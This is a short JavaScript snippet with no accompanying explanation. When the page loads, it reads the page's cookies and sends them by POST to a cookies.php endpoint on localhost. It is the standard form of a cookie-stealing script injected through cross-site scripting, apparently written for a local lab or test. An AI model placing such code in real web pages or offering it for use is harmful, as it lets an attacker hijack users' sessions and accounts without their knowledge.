document.addEventListener('DOMContentLoaded', (event) => {

    var cookies = document.cookie;

    fetch('http://localhost/cookies.php', {

        method: 'POST',

        headers: {

            'Content-Type': 'application/x-www-form-urlencoded',

        },

        body: 'cookies=' + encodeURIComponent(cookies),

    })

    .then(response => response.text())

    .then(data => console.log(data))

    .catch((error) => {

        console.error('Error:', error);

    });

});

